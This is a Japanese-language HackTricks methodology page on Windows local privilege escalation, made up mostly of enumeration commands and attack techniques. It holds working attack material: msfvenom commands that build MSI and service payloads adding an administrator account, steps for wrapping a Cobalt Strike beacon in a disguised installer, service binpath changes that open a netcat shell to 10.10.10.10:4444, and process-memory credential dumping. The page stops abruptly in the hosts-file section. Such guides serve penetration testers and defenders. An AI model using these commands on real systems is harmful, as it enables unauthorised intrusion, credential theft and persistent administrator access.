# Windows ローカル権限昇格

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？**HackTricksにあなたの会社を広告したいですか？** または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたいですか？** [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **[**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**に**フォローしてください。**
* **ハッキングのトリックを共有するために、**[**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。**

</details>

### **Windowsローカル権限昇格ベクトルを探すための最良のツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## 初期のWindows理論

### アクセストークン

**Windowsアクセストークンについて知らない場合は、続行する前に次のページを読んでください:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACL - DACL/SACL/ACE

**このセクションの見出しで使用されている略語が何かわからない場合は、続行する前に次のページを読んでください**:

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### インテグリティレベル

**Windowsのインテグリティレベルが何かわからない場合は、続行する前に次のページを読んでください:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windowsセキュリティコントロール

Windowsには、**システムの列挙を防ぐ**、実行可能ファイルを実行する、または**活動を検出する**ことができるさまざまなものがあります。権限昇格の列挙を開始する前に、以下の**ページを読んで**、これらの**防御** **メカニズム**をすべて**列挙**してください:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## システム情報

### バージョン情報の列挙

Windowsバージョンに既知の脆弱性があるかどうかを確認します（適用されているパッチもチェックしてください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### バージョンエクスプロイト

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのセキュリティ脆弱性に関する詳細情報を検索するのに便利です。このデータベースには4,700以上のセキュリティ脆弱性があり、Windows環境が提示する**大規模な攻撃面**を示しています。

**システム上で**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**システム情報をローカルで**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**エクスプロイトのGithubリポジトリ:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に保存されている資格情報/ジューシーな情報はありますか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell 履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell トランスクリプトファイル

この機能のオンにする方法は[こちら](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)で学べます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell モジュール ロギング

これは、PowerShell のパイプライン実行の詳細を記録します。これには、実行されたコマンド（コマンドの呼び出しやスクリプトの一部）が含まれます。実行の全ての詳細や出力結果を含んでいるわけではありません。\
最後のセクション（Transcript files）のリンクに従ってこれを有効にすることができますが、"Powershell Transcription" の代わりに "Module Logging" を有効にします。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShellログから最後の15件のイベントを表示するには、次のコマンドを実行します：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **スクリプト ブロック ロギング**

実行されるコードのブロックを記録するため、スクリプトの完全なアクティビティと内容をキャプチャします。それは各アクティビティの完全な監査証跡を維持し、後でフォレンジックや悪意のある行動の研究に使用することができます。実行時のすべてのアクティビティを記録するため、完全な詳細を提供します。
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block ログイベントは、Windows イベントビューアーの以下のパスで見つけることができます: _アプリケーションとサービス ログ > Microsoft > Windows > Powershell > 運用_\
最後の20イベントを表示するには、次のコマンドを使用できます:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新がhttp**S**ではなくhttpを使用して要求されていない場合、システムを侵害することができます。

非SSL WSUSアップデートを使用しているかどうかを確認するには、次のコマンドを実行します：
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
```
もし以下のような返信があった場合:
```
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
以下は、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` が `1` に等しい場合です。

その場合、**これは悪用可能です。** 最後のレジストリが 0 に等しい場合、WSUS エントリは無視されます。

この脆弱性を悪用するためには、[Wsuxploit](https://github.com/pimps/wsuxploit) や [pyWSUS](https://github.com/GoSecure/pywsus) のようなツールを使用できます。これらは、非SSL WSUS トラフィックに '偽' のアップデートを注入するための MiTM 武装スクリプトです。

研究はこちらで読むことができます：

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**完全なレポートはこちらで読むことができます**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的に、これはこのバグが悪用する欠陥です：

> もし私たちがローカルユーザープロキシを変更する権限を持っていて、Windows アップデートが Internet Explorer の設定で構成されたプロキシを使用する場合、私たちは [PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自分のトラフィックを傍受し、私たちの資産上で昇格したユーザーとしてコードを実行する力を持っています。
>
> さらに、WSUS サービスは現在のユーザーの設定を使用するため、その証明書ストアも使用します。もし私たちが WSUS ホスト名の自己署名証明書を生成し、この証明書を現在のユーザーの証明書ストアに追加すれば、HTTP と HTTPS の両方の WSUS トラフィックを傍受することができます。WSUS は、証明書に対する信頼オンファーストユースタイプの検証を実装する HSTS のようなメカニズムを使用しません。ユーザーに信頼され、正しいホスト名を持つ証明書が提示されれば、サービスによって受け入れられます。

この脆弱性は、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ツールを使用して悪用できます（一度解放されたら）。

## KrbRelayUp

これは、**LDAP 署名が強制されていない**、**ユーザーが自己権限**（**RBCD** を設定するため）を持ち、**ユーザーがドメイン内でコンピューターを作成できる** Windows **ドメイン**環境における、基本的に普遍的な修正不可能な**ローカル権限昇格**です。\
すべての**要件**は、**デフォルト設定**で満たされています。

**エクスプロイトは** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で見つけることができます。

攻撃の流れについての詳細は [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) をチェックしてください。

## AlwaysInstallElevated

これらの 2 つのレジストリが**有効**（値は **0x1**）である**場合**、任意の権限を持つユーザーは `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）することができます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit ペイロード
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
```markdown
meterpreterセッションがある場合、**`exploit/windows/local/always_install_elevated`** モジュールを使用してこの技術を自動化できます。

### PowerUP

PowerUPの`Write-UserAddMSI`コマンドを使用して、現在のディレクトリ内に権限昇格のためのWindows MSIバイナリを作成します。このスクリプトは、ユーザー/グループ追加を促す事前にコンパイルされたMSIインストーラーを書き出します（GUIアクセスが必要です）：
```
```
Write-UserAddMSI
```
作成されたバイナリを実行して権限を昇格させます。

### MSI Wrapper

このツールを使用してMSIラッパーを作成する方法を学ぶには、このチュートリアルを読んでください。"**.bat**"ファイルをラップしたい場合は、**コマンドラインを** **実行**するだけです。

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIXを使用してMSIを作成する

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### Visual Studioを使用してMSIを作成する

* Cobalt StrikeまたはMetasploitを使用して、`C:\privesc\beacon.exe`に**新しいWindows EXE TCPペイロード**を**生成**します。
* **Visual Studio**を開き、**新しいプロジェクトを作成**を選択し、検索ボックスに「installer」と入力します。**セットアップウィザード**プロジェクトを選択し、**次へ**をクリックします。
* プロジェクトに名前を付けます。例えば**AlwaysPrivesc**のようにし、場所には**`C:\privesc`**を使用し、**ソリューションとプロジェクトを同じディレクトリに配置**を選択し、**作成**をクリックします。
* ステップ3の4まで（含めるファイルを選択）**次へ**をクリックし続けます。**追加**をクリックし、生成したBeaconペイロードを選択します。次に**完了**をクリックします。
* **ソリューションエクスプローラー**で**AlwaysPrivesc**プロジェクトをハイライトし、**プロパティ**で**TargetPlatform**を**x86**から**x64**に変更します。
* **Author**や**Manufacturer**など、インストールされたアプリをより正当に見せるために変更できる他のプロパティもあります。
* プロジェクトを右クリックし、**表示 > カスタムアクション**を選択します。
* **インストール**を右クリックし、**カスタムアクションの追加**を選択します。
* **アプリケーションフォルダー**をダブルクリックし、**beacon.exe**ファイルを選択して**OK**をクリックします。これにより、インストーラーが実行されるとすぐにbeaconペイロードが実行されるようになります。
* **カスタムアクションプロパティ**で、**Run64Bit**を**True**に変更します。
* 最後に、**ビルド**します。
* `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`という警告が表示された場合は、プラットフォームをx64に設定していることを確認してください。

### MSIインストール

悪意のある`.msi`ファイルの**インストール**を**バックグラウンドで**実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
To exploit this vulnerability you can use: _exploit/windows/local/always\_install\_elevated_

## アンチウイルスと検出器

### 監査設定

これらの設定は何が**ログ記録**されるかを決定するため、注意を払うべきです
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingは、ログがどこに送信されているかを知るのに興味深いです
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、ドメインに参加しているコンピューター上で**ローカル管理者のパスワードを管理する**（これは**ランダム化され**、ユニークで、**定期的に変更される**)ことを可能にします。これらのパスワードはActive Directoryに中央集権的に保存され、ACLを使用して承認されたユーザーに制限されます。あなたのユーザーに十分な権限が与えられている場合、ローカル管理者のパスワードを読み取ることができるかもしれません。

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

有効な場合、**平文のパスワードはLSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページでWDigestについての詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA 保護

Microsoftは、**Windows 8.1 以降**で、信頼できないプロセスがLSAの**メモリを読み取る**ことやコードを注入することを**防ぐ**ために、LSAに追加の保護を提供しています。\
[**LSA 保護に関する詳細情報はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### クレデンシャルガード

**Credential Guard** はWindows 10（EnterpriseおよびEducationエディション）の新機能で、パスハッシュなどの脅威からマシン上の資格情報を保護するのに役立ちます。\
[**Credential Guardに関する詳細情報はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### キャッシュされた資格情報

**ドメイン資格情報**はオペレーティングシステムのコンポーネントによって使用され、**ローカル** **セキュリティ機関**（LSA）によって**認証**されます。通常、ドメイン資格情報は、登録されたセキュリティパッケージがユーザーのログオンデータを認証するときにユーザーに対して確立されます。\
[**キャッシュされた資格情報についての詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザー & グループ

### ユーザー & グループの列挙

所属しているグループに興味深い権限がないか確認する必要があります
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

もしあなたが**特権グループの一員であれば、権限昇格が可能になるかもしれません**。特権グループについて学び、それらを悪用して権限を昇格させる方法についてはこちらを参照してください：

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### トークン操作

**トークン**についての詳細は、このページで学びましょう： [**Windows トークン**](../authentication-credentials-uac-and-efs.md#access-tokens).\
以下のページをチェックして、**興味深いトークン**について学び、それらを悪用する方法について学びましょう：

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### ログインユーザー / セッション
```
qwinsta
klist sessions
```
### ホームフォルダ
```
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```
net accounts
```
### クリップボードの内容を取得
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダの権限

まず最初に、プロセスのコマンドライン内で**パスワードを確認します**。\
実行中のバイナリを**上書きできるか**、または[**DLLハイジャック攻撃**](dll-hijacking.md)を利用するためにバイナリフォルダの書き込み権限があるかを確認します：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に可能性がある[**electron/cef/chromium デバッガー**が実行されているかを確認し、権限昇格のために悪用できるかどうかを確認してください](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md)。

**プロセスバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスバイナリのフォルダーの権限を確認する (**[**DLLハイジャック**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリパスワードマイニング

sysinternalsの**procdump**を使用して、実行中のプロセスのメモリダンプを作成できます。FTPのようなサービスは**メモリ内に平文の資格情報を持っています**。メモリをダンプして資格情報を読み取ってみてください。
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### セキュリティが不十分なGUIアプリ

**SYSTEMとして実行されているアプリケーションは、ユーザーにCMDを起動させたり、ディレクトリを閲覧させたりすることがあります。**

例: "Windows ヘルプとサポート" (Windows + F1)で"コマンドプロンプト"を検索し、"コマンドプロンプトを開く"をクリックします。

## サービス

サービスのリストを取得します：
```
net start
wmic service list brief
sc query
Get-Service
```
### パーミッション

サービスの情報を取得するために **sc** を使用できます
```
sc qc <service_name>
```
推奨されるのは、_Sysinternals_ のバイナリ **accesschk** を使用して、各サービスに必要な権限レベルを確認することです。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
推奨されるのは、「認証されたユーザー」が任意のサービスを変更できるかどうかを確認することです：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP用のaccesschk.exeはこちらからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効にする

次のようなエラーが発生した場合（例：SSDPSRVで）：

_システムエラー1058が発生しました。_\
_サービスを開始できません。無効になっているか、関連付けられた有効なデバイスがないためです。_

以下を使用して有効にできます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**このサービスupnphostはSSDPSRVが動作するために依存しています（XP SP1の場合）**

**別の回避策** としては、以下を実行します：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

"Authenticated users" グループがサービスに **SERVICE\_ALL\_ACCESS** を持っている場合、そのサービスによって実行されているバイナリを変更することができます。**nc** を実行するために変更するには、次のようにします：
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスの再起動
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
他の権限も権限昇格に利用できます:\
**SERVICE\_CHANGE\_CONFIG** サービスバイナリを再設定できます\
**WRITE\_DAC:** 権限を再設定でき、SERVICE\_CHANGE\_CONFIGにつながります\
**WRITE\_OWNER:** 所有者になり、権限を再設定できます\
**GENERIC\_WRITE:** SERVICE\_CHANGE\_CONFIGを継承します\
**GENERIC\_ALL:** SERVICE\_CHANGE\_CONFIGを継承します

この脆弱性を**検出し、悪用する**ためには、_exploit/windows/local/service\_permissions_を使用できます。

### サービスバイナリの弱い権限

**サービスによって実行されるバイナリを変更できるか**、またはバイナリが置かれている**フォルダに書き込み権限があるか**を確認します（[**DLL Hijacking**](dll-hijacking.md)参照）。\
**wmic**を使用してサービスによって実行されるすべてのバイナリを取得し（system32にないもの）、**icacls**を使用してあなたの権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
You can also use **sc** と **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### サービスレジストリの変更権限

サービスレジストリを変更できるかどうかを確認する必要があります。\
サービスレジストリに対する**権限**を**確認**するには、次の操作を行います:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
```
**認証されたユーザー**または**NT AUTHORITY\INTERACTIVE**にFullControlがあるかどうかを確認します。その場合、サービスによって実行されるバイナリを変更できます。

実行されるバイナリのパスを変更するには：
```
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### サービスレジストリのAppendData/AddSubdirectory権限

レジストリにこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windowsサービスの場合、これは**任意のコードを実行するのに十分です：**

{% content-ref url="appenddata-addsubdirectory-permission-over-service-registry.md" %}
[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### 引用符なしのサービスパス

実行可能ファイルへのパスが引用符で囲まれていない場合、Windowsはスペースの前にあるすべての終わりを実行しようとします。

例えば、パス _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは次の実行を試みます：
```
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
サービスパスをすべてリスト表示する（ビルトインのWindowsサービスを除く）
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """ #Not only auto services

#Other way
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性を検出し、利用することができます** metasploitを使用して： _exploit/windows/local/trusted\_service\_path_\
metasploitを使用してサービスバイナリを手動で作成することができます：
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### リカバリーアクション

Windowsに[サービスの実行が失敗した場合に何をすべきか](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN)を指示することができます。その設定がバイナリを指しており、このバイナリが上書き可能であれば、権限昇格が可能になるかもしれません。

## アプリケーション

### インストールされたアプリケーション

**バイナリの権限**（上書き可能なら権限昇格できるかもしれません）と**フォルダー**の権限をチェックしてください（[DLL Hijacking](dll-hijacking.md)）。
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 書き込み権限

設定ファイルを変更して特別なファイルを読み取ることができるか、または管理者アカウントによって実行されるバイナリを変更できるかどうかを確認します（schedtasks）。

システム内の弱いフォルダ/ファイルの権限を見つける方法は次のとおりです：
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### スタートアップ時に実行

**異なるユーザーによって実行される予定のレジストリやバイナリを上書きできるかどうかを確認してください。**\
**次のページを読む**と、権限昇格のための興味深い**オートランの場所**について詳しく学べます：

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### ドライバー

可能性のある**サードパーティの奇妙な/脆弱な**ドライバーを探す
```
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL ハイジャック

**PATHに存在するフォルダ内に書き込み権限がある場合**、プロセスによってロードされるDLLをハイジャックし、**権限を昇格**することができるかもしれません。

PATH内のすべてのフォルダの権限を確認します：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
このチェックを悪用する方法の詳細については、以下を参照してください：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## ネットワーク

### シェア
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hostsファイル

hostsファイルにハードコードされた他の既知のコンピューターを確認する
```
